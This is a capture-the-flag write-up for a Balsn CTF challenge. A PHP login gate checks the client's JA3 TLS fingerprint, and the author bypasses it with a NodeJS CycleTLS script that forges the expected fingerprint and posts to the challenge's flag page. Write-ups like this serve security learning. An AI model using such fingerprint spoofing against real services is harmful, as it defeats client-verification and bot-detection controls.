# Overview
This is a gadget finding challenge, the target you can see Nginx on the machine is being patched in the Dockerfile.

The patch basically overwrites the `$http_ja3` and `$http_ja3_hash` variables, and we can't manipulate the value with http headers.

JA3 is a fingerprint of TLS/SSL client, you can identify which client sent the request with it.

And the code in "config.php" will check if the client's fingerprint is equal to the hardcoded value.

```php
<?php
define("FINGERPRINT", "771,4866-4865-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0");
$flag = 'BALSN{fake_flag}';

function fingerprint_check() {
    if($_SERVER['HTTP_SSL_JA3'] !== FINGERPRINT) 
        die("Login Failed!"); 
}

```

# Solution

I was trying to bypass the check with headers, but it didn't work.
So I studied some documents and discussions of JA3, and I found out I need to fake a JA3 fingerprint.

I searched and found a NodeJS library "CycleTLS" to achieve this.
```javascript
const initCycleTLS = require('cycletls');

(async () => {
  const cycleTLS = await initCycleTLS();

  // Send request
  const response = await cycleTLS('https://0fa.balsnctf.com:8787/flag.php', {
    body: 'username=admin',
    ja3: '771,4866-4865-4867-49195-49199-49196-49200-52393-52392-49171-49172-156-157-47-53,23-65281-10-11-35-16-5-13-18-51-45-43-27-17513,29-23-24,0',
    userAgent: 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0',
    headers: { "Content-Type": "application/x-www-form-urlencoded" }
  }, 'POST');

  console.log(response);

  // Cleanly exit CycleTLS
  cycleTLS.exit();

})();
```